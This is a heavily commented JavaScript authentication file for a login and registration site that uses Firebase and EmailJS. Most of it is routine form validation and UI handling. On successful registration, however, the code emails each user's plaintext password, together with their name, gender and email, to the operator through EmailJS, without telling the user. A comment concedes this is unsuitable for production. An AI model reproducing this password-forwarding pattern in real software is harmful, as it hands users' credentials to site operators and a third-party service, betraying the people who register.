/* ================================================================
   NEXTER AUTH — auth.js
   Shared JavaScript for login.html and register.html

   HOW THIS FILE WORKS:
   ─────────────────────────────────────────────────────────────
   This single file handles BOTH pages.
   On page load it checks which page is open by looking for
   specific elements (e.g. #loginForm or #registerForm).
   It then runs only the relevant logic for that page.

   OVERALL FLOW:
   ─────────────────────────────────────────────────────────────
   LOGIN PAGE:
     User fills email + password → SIGN IN clicked
       → Firebase signInWithEmailAndPassword()
           ✅ Success → show success modal
           ❌ Fail    → show Firebase error message

   REGISTER PAGE:
     User fills name, gender, email, password → REGISTER clicked
       → Field validation
       → Firebase createUserWithEmailAndPassword()
           ✅ Success → send EmailJS email → redirect to login.html
           ❌ Fail    → show Firebase error message

   FIREBASE BRIDGE:
   ─────────────────────────────────────────────────────────────
   Firebase v9+ uses ES Modules. This file is a classic script.
   The bridge is set up in each HTML file:
     login.html    → window.firebaseSignIn(email, pw)
     register.html → window.firebaseRegister(email, pw)
   Both return Promises, just like native Firebase calls.

================================================================ */


/* ================================================================
   SECTION 1 — EMAILJS INITIALISATION
   ─────────────────────────────────────────────────────────────
   emailjs.init() must be called ONCE before emailjs.send().
   It tells EmailJS which account to authenticate as.

   WHERE TO FIND YOUR PUBLIC KEY:
   → https://www.emailjs.com → Account → API Keys

   MODIFY: Replace the string with your own Public Key if you
   switch EmailJS accounts.
================================================================ */
emailjs.init('mO_avheOvNIQ-uzdh');
//            ↑ Public Key — safe to include in frontend code


/* ================================================================
   SECTION 2 — UTILITY HELPERS
   Small reusable functions used by both login and register logic.
================================================================ */

/* ──────────────────────────────────────────────────────────────
   isValidEmail(email)
   Returns true if the string looks like a valid email.
   MODIFY: Replace the regex for stricter/looser checking.
────────────────────────────────────────────────────────────── */
function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

/* ──────────────────────────────────────────────────────────────
   showFieldError(inputEl, errEl, message)
   Marks an input as invalid and shows the error below it.
   Also triggers the shake animation for emphasis.
────────────────────────────────────────────────────────────── */
function showFieldError(inputEl, errEl, message) {
  // Add red border to input
  inputEl.classList.add('field-invalid');

  // Show the error message text
  errEl.textContent = message;
  errEl.classList.add('show');

  // Shake the input wrapper for visual emphasis
  const wrapper = inputEl.closest('.field-wrap');
  if (wrapper) {
    wrapper.classList.add('shake');
    // Remove shake class after animation so it can trigger again next time
    wrapper.addEventListener('animationend', () => {
      wrapper.classList.remove('shake');
    }, { once: true });
  }
}

/* ──────────────────────────────────────────────────────────────
   clearFieldError(inputEl, errEl)
   Removes the error state from a field.
   Called when the user types into a field after seeing an error.
────────────────────────────────────────────────────────────── */
function clearFieldError(inputEl, errEl) {
  inputEl.classList.remove('field-invalid');
  errEl.classList.remove('show');
}

/* ──────────────────────────────────────────────────────────────
   setLoading(btn, isLoading, defaultLabel)
   Shows/hides the spinner on a submit button.
   Disables the button while loading to prevent double-clicks.

   Parameters:
   • btn          — the <button> element
   • isLoading    — true = show spinner, false = restore
   • defaultLabel — the original button text (e.g. "SIGN IN")
────────────────────────────────────────────────────────────── */
function setLoading(btn, isLoading, defaultLabel) {
  const label = btn.querySelector('.btn-label');
  if (isLoading) {
    btn.disabled = true;
    btn.classList.add('loading');
    if (label) label.textContent = 'Please wait...';
  } else {
    btn.disabled = false;
    btn.classList.remove('loading');
    if (label) label.textContent = defaultLabel;
  }
}

/* ──────────────────────────────────────────────────────────────
   showStatus(el, message, type)
   Shows the status strip below the form card.

   Parameters:
   • el      — the .status-box element
   • message — text to display
   • type    — 'ok' (green) or 'err' (red)
────────────────────────────────────────────────────────────── */
function showStatus(el, message, type) {
  el.textContent = message;
  el.classList.remove('status-ok', 'status-err');
  el.classList.add('status-' + type);
  // Scroll status into view if it's off-screen
  el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  // Auto-hide after 6 seconds
  // MODIFY: change 6000 to adjust how long the message stays visible
  setTimeout(() => {
    el.classList.remove('status-ok', 'status-err');
    el.textContent = '';
  }, 6000);
}

/* ──────────────────────────────────────────────────────────────
   getFriendlyFirebaseError(code)
   Converts Firebase error codes to human-readable messages.
   MODIFY: Add more codes to customise the error messages shown.
────────────────────────────────────────────────────────────── */
function getFriendlyFirebaseError(code) {
  const map = {
    'auth/user-not-found':         'No account found with this email address.',
    'auth/wrong-password':         'Incorrect password. Please try again.',
    'auth/invalid-email':          'The email address format is not valid.',
    'auth/invalid-credential':     'Invalid email or password. Please check and try again.',
    'auth/email-already-in-use':   'An account with this email already exists.',
    'auth/weak-password':          'Password must be at least 6 characters.',
    'auth/user-disabled':          'This account has been disabled. Contact support.',
    'auth/too-many-requests':      'Too many failed attempts. Please wait a moment.',
    'auth/network-request-failed': 'Network error. Please check your connection.',
  };
  return map[code] || 'Something went wrong. Please try again.';
}

/* ──────────────────────────────────────────────────────────────
   setupEyeToggle(inputId, eyeBtnId, eyeIconId)
   Wires up the show/hide password toggle button for any field.
   Works the same for both login and register pages.

   Parameters:
   • inputId   — id of the <input type="password"> element
   • eyeBtnId  — id of the <button> toggle
   • eyeIconId — id of the <svg> icon inside the button
────────────────────────────────────────────────────────────── */
function setupEyeToggle(inputId, eyeBtnId, eyeIconId) {
  const input   = document.getElementById(inputId);
  const eyeBtn  = document.getElementById(eyeBtnId);
  const eyeIcon = document.getElementById(eyeIconId);

  // Only set up if all three elements exist on this page
  if (!input || !eyeBtn || !eyeIcon) return;

  eyeBtn.addEventListener('click', function () {
    const isHidden = input.type === 'password';
    input.type = isHidden ? 'text' : 'password';

    // Swap the eye icon between "open eye" and "eye with slash"
    eyeIcon.innerHTML = isHidden
      // Password now visible → show slashed eye
      ? `<path d="M1 10s3.5-6 9-6 9 6 9 6-3.5 6-9 6-9-6-9-6z" stroke="currentColor" stroke-width="1.5"/>
         <circle cx="10" cy="10" r="2.5" stroke="currentColor" stroke-width="1.5"/>
         <line x1="3" y1="3" x2="17" y2="17" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>`
      // Password now hidden → show normal eye
      : `<path d="M1 10s3.5-6 9-6 9 6 9 6-3.5 6-9 6-9-6-9-6z" stroke="currentColor" stroke-width="1.5"/>
         <circle cx="10" cy="10" r="2.5" stroke="currentColor" stroke-width="1.5"/>`;
  });
}


/* ================================================================
   SECTION 3 — LOGIN PAGE LOGIC
   Runs only if #loginForm exists on the current page.
================================================================ */
(function initLoginPage() {

  // Look for the login form — if it's not here, we're on register.html, so stop
  const loginForm = document.getElementById('loginForm');
  if (!loginForm) return;

  /* ── Grab all login page elements ── */
  const loginEmail       = document.getElementById('loginEmail');
  const loginEmailErr    = document.getElementById('loginEmailErr');
  const loginPassword    = document.getElementById('loginPassword');
  const loginPasswordErr = document.getElementById('loginPasswordErr');
  const loginBtn         = document.getElementById('loginBtn');
  const loginStatus      = document.getElementById('loginStatus');
  const successModal     = document.getElementById('successModal');
  const modalOkBtn       = document.getElementById('modalOkBtn');

  /* ── Set up password show/hide toggle ── */
  setupEyeToggle('loginPassword', 'loginEyeBtn', 'loginEyeIcon');

  /* ── Clear field errors as the user types ── */
  loginEmail.addEventListener('input', () => clearFieldError(loginEmail, loginEmailErr));
  loginPassword.addEventListener('input', () => clearFieldError(loginPassword, loginPasswordErr));

  /* ──────────────────────────────────────────────────────────────
     LOGIN FORM SUBMIT
     Step 1: Prevent page refresh
     Step 2: Validate fields
     Step 3: Call Firebase authentication (window.firebaseSignIn)
     Step 4: Show success modal OR error message
  ────────────────────────────────────────────────────────────── */
  loginForm.addEventListener('submit', function (e) {
    e.preventDefault();  // Stop the browser from reloading the page

    /* ── Field validation ── */
    let valid = true;

    const emailVal = loginEmail.value.trim();
    if (!emailVal) {
      showFieldError(loginEmail, loginEmailErr, 'Email address is required.');
      valid = false;
    } else if (!isValidEmail(emailVal)) {
      showFieldError(loginEmail, loginEmailErr, 'Please enter a valid email address.');
      valid = false;
    }

    const pwVal = loginPassword.value;
    if (!pwVal) {
      showFieldError(loginPassword, loginPasswordErr, 'Password is required.');
      valid = false;
    }

    if (!valid) return;  // Stop if validation failed

    /* ── Show loading state ── */
    setLoading(loginBtn, true, 'SIGN IN');

    /* ──────────────────────────────────────────────────────────
       FIREBASE LOGIN
       window.firebaseSignIn is defined in the <script type="module">
       block in login.html. It calls Firebase's
       signInWithEmailAndPassword(auth, email, password).

       MODIFY: After a successful login, you could redirect the
       user to a dashboard instead of showing the modal:
         window.location.href = 'dashboard.html';
    ────────────────────────────────────────────────────────── */
    window.firebaseSignIn(emailVal, pwVal)

      .then(function (userCredential) {
        // ✅ Firebase authentication SUCCEEDED
        console.log('Firebase LOGIN SUCCESS:', userCredential.user.email);

        setLoading(loginBtn, false, 'SIGN IN');

        // Show the success modal popup
        if (successModal) {
          successModal.classList.add('modal-open');
          // Prevent background scrolling while modal is open
          document.body.style.overflow = 'hidden';
        }
      })

      .catch(function (error) {
        // ❌ Firebase authentication FAILED
        console.error('Firebase LOGIN ERROR:', error.code, error.message);

        setLoading(loginBtn, false, 'SIGN IN');

        // Convert Firebase error code → readable message
        const msg = getFriendlyFirebaseError(error.code);

        // Show it in the status box under the form
        showStatus(loginStatus, '❌ ' + msg, 'err');
      });

  }); // end loginForm submit


  /* ──────────────────────────────────────────────────────────────
     MODAL CLOSE — when user clicks the "Continue" / "OK" button
     Hides the modal and restores background scrolling.
     MODIFY: Add a redirect here if you want to send the user
     to a protected page after dismissing the modal:
       window.location.href = 'dashboard.html';
  ────────────────────────────────────────────────────────────── */
  if (modalOkBtn) {
    modalOkBtn.addEventListener('click', function () {
      if (successModal) {
        successModal.classList.remove('modal-open');
        document.body.style.overflow = '';  // restore scrolling
      }
    });
  }

  // Also close the modal if the user clicks the dark backdrop
  if (successModal) {
    successModal.addEventListener('click', function (e) {
      // Only close if the click was on the backdrop, not inside .modal-box
      if (e.target === successModal) {
        successModal.classList.remove('modal-open');
        document.body.style.overflow = '';
      }
    });
  }

  // Close modal with the Escape key
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && successModal && successModal.classList.contains('modal-open')) {
      successModal.classList.remove('modal-open');
      document.body.style.overflow = '';
    }
  });

})(); // end initLoginPage IIFE


/* ================================================================
   SECTION 4 — REGISTER PAGE LOGIC
   Runs only if #registerForm exists on the current page.
================================================================ */
(function initRegisterPage() {

  // Look for the register form — if not found, we're on login.html, stop
  const registerForm = document.getElementById('registerForm');
  if (!registerForm) return;

  /* ── Grab all register page elements ── */
  const regName        = document.getElementById('regName');
  const regNameErr     = document.getElementById('regNameErr');
  const regGender      = document.getElementById('regGender');
  const regGenderErr   = document.getElementById('regGenderErr');
  const regEmail       = document.getElementById('regEmail');
  const regEmailErr    = document.getElementById('regEmailErr');
  const regPassword    = document.getElementById('regPassword');
  const regPasswordErr = document.getElementById('regPasswordErr');
  const registerBtn    = document.getElementById('registerBtn');
  const registerStatus = document.getElementById('registerStatus');

  /* ── Set up password show/hide toggle ── */
  setupEyeToggle('regPassword', 'regEyeBtn', 'regEyeIcon');

  /* ── Clear individual field errors as the user types ── */
  regName.addEventListener('input',     () => clearFieldError(regName,     regNameErr));
  regGender.addEventListener('change',  () => clearFieldError(regGender,   regGenderErr));
  regEmail.addEventListener('input',    () => clearFieldError(regEmail,    regEmailErr));
  regPassword.addEventListener('input', () => clearFieldError(regPassword, regPasswordErr));

  /* ──────────────────────────────────────────────────────────────
     REGISTER FORM SUBMIT
     Step 1: Prevent page refresh
     Step 2: Validate all four fields
     Step 3: Call Firebase to create the account
     Step 4: On success — send EmailJS notification email
     Step 5: Redirect to login.html
  ────────────────────────────────────────────────────────────── */
  registerForm.addEventListener('submit', function (e) {
    e.preventDefault();  // Prevent browser page reload

    /* ── Collect and validate all field values ── */
    let valid = true;

    const nameVal   = regName.value.trim();
    const genderVal = regGender.value;
    const emailVal  = regEmail.value.trim();
    const pwVal     = regPassword.value;

    // Validate Name
    if (!nameVal) {
      showFieldError(regName, regNameErr, 'Full name is required.');
      valid = false;
    }

    // Validate Gender (must select Male or Female)
    if (!genderVal) {
      showFieldError(regGender, regGenderErr, 'Please select your gender.');
      valid = false;
    }

    // Validate Email
    if (!emailVal) {
      showFieldError(regEmail, regEmailErr, 'Email address is required.');
      valid = false;
    } else if (!isValidEmail(emailVal)) {
      showFieldError(regEmail, regEmailErr, 'Please enter a valid email address.');
      valid = false;
    }

    // Validate Password — Firebase requires at least 6 characters
    if (!pwVal) {
      showFieldError(regPassword, regPasswordErr, 'Password is required.');
      valid = false;
    } else if (pwVal.length < 6) {
      showFieldError(regPassword, regPasswordErr, 'Password must be at least 6 characters.');
      valid = false;
    }

    if (!valid) return;  // Don't proceed if any field is invalid

    /* ── Show loading state on the button ── */
    setLoading(registerBtn, true, 'REGISTER');

    /* ──────────────────────────────────────────────────────────
       CAPTURE REGISTRATION TIME
       Formatted as: "Monday, 9 March 2026, 14:35:22"
       This is sent to EmailJS as the {{register_time}} variable.
       MODIFY: Change locale/options to change the date format.
    ────────────────────────────────────────────────────────── */
    const registerTime = new Date().toLocaleString('en-GB', {
      weekday: 'long',
      year:    'numeric',
      month:   'long',
      day:     'numeric',
      hour:    '2-digit',
      minute:  '2-digit',
      second:  '2-digit',
    });

    /* ──────────────────────────────────────────────────────────
       FIREBASE REGISTRATION
       window.firebaseRegister is defined in the <script type="module">
       block in register.html. It calls Firebase's
       createUserWithEmailAndPassword(auth, email, password).

       If successful, Firebase creates the user account and
       returns a UserCredential object.
    ────────────────────────────────────────────────────────── */
    window.firebaseRegister(emailVal, pwVal)

      .then(function (userCredential) {
        // ✅ Firebase account created successfully
        console.log('Firebase REGISTER SUCCESS:', userCredential.user.email);

        /* ──────────────────────────────────────────────────────
           EMAILJS — send registration details to your email
           ─────────────────────────────────────────────────────
           emailjs.send() fills your EmailJS template with the
           parameters below and sends it to your inbox.

           Template variables (must match your EmailJS template):
           {{name}}          → user's full name
           {{gender}}        → Male / Female
           {{email}}         → user's email address
           {{password}}      → user's chosen password
           {{register_time}} → timestamp of registration

           SERVICE ID and TEMPLATE ID:
           MODIFY: Replace these strings if you change your
           EmailJS service or template.

           WARNING: Sending the raw password is only appropriate
           for admin monitoring. In production, never expose
           passwords in emails or logs.
        ────────────────────────────────────────────────────── */
        return emailjs.send(
          'service_tf4a0cw',   // ← Your EmailJS SERVICE ID
          'template_kn3a4cr',  // ← Your EmailJS TEMPLATE ID
          {
            name:          nameVal,       // → {{name}} in template
            gender:        genderVal,     // → {{gender}} in template
            email:         emailVal,      // → {{email}} in template
            password:      pwVal,         // → {{password}} in template
            register_time: registerTime,  // → {{register_time}} in template
          }
          // Public Key already set via emailjs.init() — no need to repeat
        );
      })

      .then(function (emailResponse) {
        // ✅ EmailJS email sent successfully
        console.log('EmailJS SEND SUCCESS:', emailResponse.status);

        setLoading(registerBtn, false, 'REGISTER');

        // Show brief success message before redirect
        showStatus(registerStatus, '✅ Account created! Redirecting to login...', 'ok');

        // Redirect to login.html after 2 seconds
        // MODIFY: Change the delay (2000ms) or destination URL
        setTimeout(() => {
          window.location.href = 'login.html';
        }, 2000);
      })

      .catch(function (error) {
        // ❌ Either Firebase registration OR EmailJS send failed
        setLoading(registerBtn, false, 'REGISTER');

        if (error.code) {
          // Firebase error — has an error.code string like "auth/email-already-in-use"
          console.error('Firebase REGISTER ERROR:', error.code, error.message);
          const msg = getFriendlyFirebaseError(error.code);
          showStatus(registerStatus, '❌ ' + msg, 'err');
        } else {
          // EmailJS error — Firebase succeeded but email failed to send
          console.error('EmailJS SEND ERROR:', error);
          // Registration still worked in Firebase, so redirect anyway
          showStatus(registerStatus, '⚠️ Account created but email notification failed. Redirecting...', 'ok');
          setTimeout(() => { window.location.href = 'login.html'; }, 2500);
        }
      });

  }); // end registerForm submit

})(); // end initRegisterPage IIFE
